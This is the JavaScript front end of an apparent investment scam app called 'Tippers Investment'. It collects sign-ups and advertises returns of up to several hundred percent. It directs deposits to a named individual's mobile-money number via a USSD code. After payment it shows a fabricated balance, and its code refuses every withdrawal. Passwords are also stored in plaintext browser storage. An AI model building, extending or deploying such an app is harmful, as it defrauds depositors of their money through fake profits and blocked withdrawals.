<script>

/* STATE */
let users = JSON.parse(localStorage.getItem("users")) || [];
let currentUser = null;
let depositDone = false;
let amount = 0;
let selectedPeriod = 0;

const screen=document.getElementById("screen");

/* TOAST */
function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* LOCK NAV */
function lockCheck(){
if(!depositDone){
toast("To activate other services finish deposit process ❌");
return false;
}
return true;
}

/* START */
function start(){
screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<p class="desc">Start now and grow your income smartly.</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`

<h3 class="title">REGISTER</h3>

<input id="f" placeholder="Enter first name">
<input id="l" placeholder="Enter last name">

<select id="g">
<option value="">Select gender</option>
<option>Male</option>
<option>Female</option>
</select>

<div class="row">
<select id="code">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
</select>
<input id="phone" placeholder="Phone number">
</div>

<input id="email" placeholder="Enter your email">
<input id="pass" placeholder="6 digit password">
<input id="cpass" placeholder="Confirm password">

<button onclick="doRegister()">REGISTER</button>
`;
}

/* REGISTER */
function doRegister(){

if(!f.value||!l.value||!g.value||!phone.value||!email.value||!pass.value||!cpass.value){
toast("Fill all fields ❌"); return;
}

if(!email.value.endsWith("@gmail.com")){
toast("Invalid email ❌"); return;
}

if(!/^[0-9]{6}$/.test(pass.value)){
toast("Password must be 6 digits ❌"); return;
}

if(pass.value!==cpass.value){
toast("Passwords do not match ❌"); return;
}

users.push({email:email.value,pass:pass.value});
localStorage.setItem("users",JSON.stringify(users));

toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`

<h3 class="title">Login to continue</h3>

<input id="le" placeholder="Enter email">
<input id="lp" placeholder="Enter password">

<div style="display:flex;justify-content:space-between">
<span onclick="forgot()" style="color:#f59e0b;cursor:pointer">Forgot password</span>
<span onclick="register()" style="color:#f59e0b;cursor:pointer">Create account</span>
</div>

<button onclick="doLogin()">LOGIN</button>
`;
}

/* LOGIN */
function doLogin(){

if(!le.value||!lp.value){
toast("Fill all fields ❌"); return;
}

let u=users.find(x=>x.email===le.value);

if(!u){
toast("Account not found ❌"); return;
}

if(lp.value!==u.pass){
toast("Invalid password ❌"); return;
}

currentUser=u;

/* GO HOME (PLAN) */
home();
}

/* HOME (PLAN TABLE) */
function home(){

screen.innerHTML=`

<h3 class="title">TIPPERS INVESTMENT PLAN</h3>

<div class="plan">

<div class="rowPlan headerRow">
<div>INVEST</div>
<div>2.2%</div>
<div>3%</div>
<div>3.6%</div>
<div>4.1%</div>
<div>5%</div>
<div>7%</div>
</div>

<div class="rowPlan"><div>5k</div><div>110</div><div>1050</div><div>5400</div><div>9225</div><div>22500</div><div>42000</div></div>
<div class="rowPlan"><div>50k</div><div>1100</div><div>10500</div><div>54000</div><div>92250</div><div>225000</div><div>420000</div></div>
<div class="rowPlan"><div>100k</div><div>2200</div><div>21000</div><div>108000</div><div>184500</div><div>450000</div><div>840000</div></div>
<div class="rowPlan"><div>300k</div><div>6600</div><div>63000</div><div>324000</div><div>553500</div><div>1350000</div><div>2520000</div></div>
<div class="rowPlan"><div>1M</div><div>22000</div><div>210000</div><div>1080000</div><div>1845000</div><div>4500000</div><div>8400000</div></div>

</div>

<button onclick="deposit()">NEXT</button>
`;
}

/* DEPOSIT */
function deposit(){
screen.innerHTML=`

<h3 class="title">DEPOSIT BALANCE</h3>

<input id="amt" placeholder="Amount (RWF)">
<p>Minimum 5000 RWF</p>

<input id="sender" placeholder="Sender name">

<button onclick="goPayment()">CONTINUE</button>
`;
}

function goPayment(){

if(!amt.value||!sender.value){
toast("Fill all fields ❌"); return;
}

let a=parseInt(amt.value);

if(a<5000){
toast("Minimum 5000 ❌"); return;
}

amount=a;
payment();
}

/* PAYMENT */
function payment(){
screen.innerHTML=`

<h3 class="title">PAYMENT INFORMATION</h3>

<div class="card">
0795410739<br><br>BARAKA BOLINGO
</div>

<button onclick="dial()">DIAL & PAY</button>
`;
}

/* DIAL */
function dial(){
screen.innerHTML=`

<div>*182*1*1*0795410739#</div>

<p class="desc">Upload proof of payment screenshot</p>

<input type="file" id="file">

<button onclick="submitProof()">SUBMIT</button>
`;
}

function submitProof(){
if(!file.value){
toast("Upload proof ❌"); return;
}
withdrawPeriod();
}

/* PERIOD */
function withdrawPeriod(){
screen.innerHTML=`

<h3 class="title">WITHDRAW PERIOD</h3>

<select id="period">
<option value="daily">1day</option>
<option value="week">7days</option>
<option value="month">14days</option>
<option value="45">45days</option>
<option value="3m">3month</option>
<option value="4m">4month</option>
</select>

<button onclick="finish()">SEND & CONFIRM</button>
`;
}

/* PROFIT TABLE LOGIC */
function getProfit(a,p){

if(a==5000 && p=="4m") return 42000;
if(a==300000 && p=="4m") return 2520000;
if(a==1000000 && p=="4m") return 8400000;

/* fallback */
return Math.floor(a*2);
}

/* FINISH */
function finish(){
selectedPeriod=period.value;
depositDone=true;

let finalAmount=getProfit(amount,selectedPeriod);

screen.innerHTML=`
<div class="card">
<h2 class="title">Your Balance</h2>
<h1>${finalAmount} RWF</h1>
</div>
`;
}

/* WITHDRAW */
function withdraw(){

if(!lockCheck()) return;

screen.innerHTML=`

<h3 class="title">WITHDRAW</h3>

<input id="wamt" placeholder="0 RWF">
<p>Minimum 7500 RWF</p>

<input id="wphone" placeholder="Enter MTN number (078/079)">

<button onclick="doWithdraw()">WITHDRAW</button>
`;
}

function doWithdraw(){

let num=wphone.value;

if(!num.startsWith("078") && !num.startsWith("079")){
toast("Use MTN number only ❌");
return;
}

let w=parseInt(wamt.value);

if(!w || w<7500){
toast("INVALID INPUT ❌");
return;
}

toast("You're not allowed to withdraw before the locked schedule.");
}

/* EARN */
function earn(){
if(!lockCheck()) return;
screen.innerHTML=`<div class="card">Live Earnings...</div>`;
}

/* START */
start();

</script>
